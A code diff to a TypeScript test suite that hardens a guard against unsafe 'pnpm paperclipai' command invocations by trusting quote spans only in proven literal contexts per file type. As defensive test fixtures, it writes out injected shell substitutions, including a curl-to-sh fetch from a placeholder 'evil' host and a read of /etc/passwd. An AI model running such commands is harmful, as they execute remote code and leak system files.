@@ -116,31 +116,42 @@ const DOC_PHRASES = new Set<string>([
 // allowlisted `pnpm paperclipai run` and pass, while the copied command still
 // runs the shell substitution.
 //
-// The scan reads Markdown and source files. A `pnpm paperclipai` occurrence
-// sits in one of two places, and only a real terminator ends the command:
-//  - Inside a balanced string span whose opener is directly next to the marker.
-//    A backtick opens a Markdown inline-code span or a JavaScript template
-//    literal. A double quote opens a source string literal. The guard trusts the
-//    span only when the opening delimiter is adjacent to the marker: the
-//    delimiter, then optional whitespace or a `$ ` shell prompt, then `pnpm`.
-//    The next matching delimiter closes the span. That close is a real, safely
-//    parsed boundary. The command is the text from the marker to the close.
-//  - Outside a trusted span. This holds for a fenced code block, plain text, and
-//    any line where the nearest earlier delimiter is not adjacent to the marker.
-//    The command runs to the end of the logical line, or to a ` #` comment. A
-//    backtick, a quote, or a parenthesis here is a shell metacharacter, so it
-//    stays in the extracted command. The command then fails the allowlist match
-//    and the guard reports it. This is the key rule: a quote or a backtick that
-//    follows the command is never a truncation boundary, so a line such as
-//    `pnpm paperclipai run "$(cat secret)"` keeps its dangerous suffix and the
-//    guard rejects it.
+// The guard trusts a string span only inside a proven literal context. The
+// context depends on the file type, so the guard reads the scanned file path
+// (`relPath`). A quote means a different thing in each language, so the guard
+// must not trust the same span shape everywhere.
+//  - Shell (`.sh`): never trust a quote or a backtick span. A shell concatenates
+//    a quoted string with the text next to it, so a close quote is not a safe
+//    boundary. The guard extracts to the logical line end and lets the allowlist
+//    reject any tail that is not a proven terminator.
+//  - Markdown (`.md`, `.mdx`): trust a backtick inline-code span only. A backtick
+//    opens a real literal span. A double quote in Markdown is plain prose, not a
+//    literal delimiter, so the guard does not trust a double-quote span.
+//  - Source (`.ts`, `.tsx`, `.js`, `.jsx`): trust a quote span only when a
+//    source-string terminator follows the close delimiter. A terminator is one
+//    of `,` `;` `)` `]` `}`, after optional whitespace. A close delimiter that a
+//    shell expansion (for example `$(`) or a string concatenation follows is not
+//    a proven literal end, so the guard does not trust the span.
+//  - Any other file type: never trust a span, and fail closed.
 //
-// The guard fails closed on an ambiguous quote context. It never infers a safe
-// enclosing span from an arbitrary unmatched delimiter earlier on the line. An
-// earlier `"` or backtick that is not adjacent to the marker is ambiguous
-// context, so the guard extracts to the logical line end and keeps any dangerous
-// suffix in the command. An escaped delimiter (`\"` or an escaped backtick) is
-// literal text, so it never opens or closes a span.
+// The guard trusts a span only when its opener is adjacent to the marker: the
+// delimiter, then optional whitespace or a `$ ` shell prompt, then `pnpm`. When
+// the guard trusts the span, the next matching delimiter closes it, and the
+// command is the text from the marker to that close.
+//
+// Outside a proven literal context the guard fails closed. It extracts the
+// command to the logical line end, or to a ` #` comment. A backtick, a quote, or
+// a parenthesis here is a shell metacharacter, so it stays in the extracted
+// command. The command then fails the allowlist match and the guard reports it.
+// This is the key rule: a quote or a backtick that follows the command is never
+// a truncation boundary, so a line such as `pnpm paperclipai run "$(cat secret)"`
+// keeps its dangerous suffix and the guard rejects it.
+//
+// The guard never infers a safe enclosing span from an arbitrary unmatched
+// delimiter earlier on the line. An earlier `"` or backtick that is not adjacent
+// to the marker is ambiguous context, so the guard fails closed. An escaped
+// delimiter (`\"` or an escaped backtick) is literal text, so it never opens or
+// closes a span.
 //
 // The scan collapses internal whitespace, so a backslash-continued command
 // compares as one normalized string.
@@ -189,20 +200,61 @@ function nextUnescapedDelimiter(tail: string, delimiter: string): number {
   return -1;
 }
 
-function extractCommand(text: string, at: number): string {
+// Classify the scanned file by its extension. The trusted-span rule depends on
+// the file type, because a quote means a different thing in each language.
+type FileKind = "shell" | "markdown" | "source" | "other";
+
+function fileKind(relPath: string): FileKind {
+  const ext = path.extname(relPath).toLowerCase();
+  if (ext === ".sh") return "shell";
+  if (ext === ".md" || ext === ".mdx") return "markdown";
+  if (ext === ".ts" || ext === ".tsx" || ext === ".js" || ext === ".jsx") {
+    return "source";
+  }
+  return "other";
+}
+
+// A source string literal ends at a real terminator: a comma, a semicolon, or a
+// close bracket, after optional whitespace. A close delimiter that a shell
+// expansion (for example `$(`) or a string concatenation follows is not a proven
+// literal end.
+const SOURCE_TERMINATOR = /^[ \t]*[,;)\]}]/;
+
+// Return true when a trusted span opens the command in a proven literal context.
+// The context depends on the file type. The guard fails closed on every other
+// context, so it never infers a safe span outside a proven literal.
+function spanIsProvenLiteral(
+  relPath: string,
+  open: string,
+  tail: string,
+  close: number,
+): boolean {
+  const kind = fileKind(relPath);
+  if (kind === "shell" || kind === "other") return false;
+  // A Markdown backtick opens an inline-code span. A Markdown double quote is
+  // plain prose, so the guard does not trust it.
+  if (kind === "markdown") return open === "`";
+  // A source string literal (a double quote or a template backtick) is a proven
+  // literal only when a source terminator follows its close delimiter.
+  return SOURCE_TERMINATOR.test(tail.slice(close + 1));
+}
+
+function extractCommand(relPath: string, text: string, at: number): string {
   const before = text.slice(0, at);
   const tail = text.slice(at);
   const open = adjacentSpanOpener(before);
   if (open !== null) {
     // The marker sits inside a span whose opener is adjacent to the marker. The
-    // matching close delimiter is the only real terminator here.
+    // guard trusts the matching close delimiter as a real terminator only inside
+    // a proven literal context for this file type.
     const close = nextUnescapedDelimiter(tail, open);
-    const raw = close < 0 ? tail : tail.slice(0, close);
-    return normalizeCommand(raw);
+    if (close >= 0 && spanIsProvenLiteral(relPath, open, tail, close)) {
+      return normalizeCommand(tail.slice(0, close));
+    }
   }
-  // Outside a trusted span the command runs to a ` #` comment or the line end. A
-  // quote, a backtick, or a parenthesis stays inside the extracted command, so
-  // an ambiguous earlier delimiter never truncates the command.
+  // Fail closed. Outside a proven literal context the command runs to a ` #`
+  // comment or the line end. A quote, a backtick, or a parenthesis stays inside
+  // the extracted command, so a dangerous suffix fails the allowlist match.
   const comment = tail.search(/\s#/);
   const raw = comment < 0 ? tail : tail.slice(0, comment);
   return normalizeCommand(raw);
@@ -215,7 +267,7 @@ function extractCommand(text: string, at: number): string {
 // running the CLI inside a shell substitution even when the inner command is
 // literal.
 
-function findOffenders(text: string): string[] {
+function findOffenders(relPath: string, text: string): string[] {
   const offenders: string[] = [];
   const marker = "pnpm paperclipai";
   let from = 0;
@@ -225,7 +277,7 @@ function findOffenders(text: string): string[] {
     from = at + marker.length;
     const before = text.slice(0, at);
     const wrapped = /\$\(\s*$/.test(before);
-    const command = extractCommand(text, at);
+    const command = extractCommand(relPath, text, at);
     if (wrapped) {
       offenders.push(command);
       continue;
@@ -345,7 +397,7 @@ function toLogicalLines(source: string): LogicalLine[] {
 function scanText(relPath: string, source: string): string[] {
   const offenders: string[] = [];
   for (const { text, lineNumber } of toLogicalLines(source)) {
-    for (const command of findOffenders(text)) {
+    for (const command of findOffenders(relPath, text)) {
       offenders.push(`${relPath}:${lineNumber}: ${command}`);
     }
   }
@@ -512,14 +564,64 @@ describe("paperclipai CLI invocation safety", () => {
     expect(scanText("doc/E.md", adjacentEscaped)).toHaveLength(1);
   });
 
-  it("still trusts a span whose opener is adjacent to the marker", () => {
-    // A Markdown inline-code span and a source string literal both place the
-    // opener directly before the marker, so the guard reads the full command
-    // inside the span and matches the allowlist. An optional `$ ` prompt inside
-    // the span still counts as adjacent.
+  it("still trusts a span in its proven literal context", () => {
+    // A Markdown inline-code backtick span and a source string literal both place
+    // the opener directly before the marker in a proven literal context, so the
+    // guard reads the full command inside the span and matches the allowlist. An
+    // optional `$ ` prompt inside the span still counts as adjacent. The source
+    // double-quote span is proven only by the terminator that follows its close.
     expect(scanText("doc/E.md", "Run `pnpm paperclipai run` to start.")).toEqual([]);
-    expect(scanText("doc/E.md", '  command: "pnpm paperclipai onboard --yes --run",')).toEqual([]);
+    expect(scanText("config/example.ts", '  command: "pnpm paperclipai onboard --yes --run",')).toEqual([]);
     expect(scanText("doc/E.md", "Run `$ pnpm paperclipai doctor` to check.")).toEqual([]);
+  });
+
+  // ── Fail closed outside a proven literal context (context-aware spans) ────
+  //
+  // The round-5 guard trusted an adjacent quote span in every file type. So an
+  // unescaped double quote directly before the marker opened a span, and the next
+  // double quote closed it. The guard then extracted only the truncated prefix
+  // and matched the allowlist, while the text outside the close quote still
+  // reached a shell. The shape `eval "<allowlisted form>"$(untrusted)` passed
+  // with zero offenders. The guard now trusts a span only in a proven literal
+  // context for the file type, so each shape below reports one offender.
+
+  it("fails closed on a shell eval that concatenates a quoted form with a substitution", () => {
+    // A shell concatenates the quoted string with the `$( )` result, so the close
+    // quote is not a safe boundary. The `.sh` rule never trusts a quote span, so
+    // the guard keeps the dangerous suffix and reports the whole command.
+    const shell = 'eval "pnpm paperclipai run"$(curl http://evil/x | sh)';
+    expect(scanText("deploy/run.sh", shell)).toHaveLength(1);
+  });
+
+  it("fails closed on a quoted residual in a Markdown line", () => {
+    // A Markdown double quote is prose, not a literal delimiter. The guard does
+    // not trust the span, so the dangerous suffix outside the quote stays in the
+    // command and the guard reports it.
+    const md = 'Run "pnpm paperclipai run"$(cat /etc/passwd) to start.';
+    expect(scanText("doc/E.md", md)).toHaveLength(1);
+  });
+
+  it("fails closed on a TypeScript quote span that a concatenation or a substitution follows", () => {
+    // A source double quote is a literal only when a source terminator follows
+    // its close. A close quote that a `+` concatenation or a `$(` expansion
+    // follows is not a proven literal end, so the guard reports the command.
+    const concat = 'const cmd = "pnpm paperclipai run" + userInput;';
+    expect(scanText("src/build-cmd.ts", concat)).toHaveLength(1);
+    const substitution = 'const cmd = "pnpm paperclipai run"$(inject);';
+    expect(scanText("src/build-cmd.ts", substitution)).toHaveLength(1);
+  });
+
+  it("still accepts the legitimate source literals in the Playwright configs", () => {
+    // A backtick template literal and a double-quote string literal each end at a
+    // real source terminator (a comma), so the source-terminator rule proves the
+    // literal context and the allowlist matches. These two real files must pass.
+    expect(scanText("tests/e2e/playwright.config.ts", read("tests/e2e/playwright.config.ts"))).toEqual([]);
+    expect(
+      scanText(
+        "tests/perf/issue-detail/playwright.config.ts",
+        read("tests/perf/issue-detail/playwright.config.ts"),
+      ),
+    ).toEqual([]);
   });
 
   it("flags an allowlisted prefix with a backtick suffix on a continued line", () => {
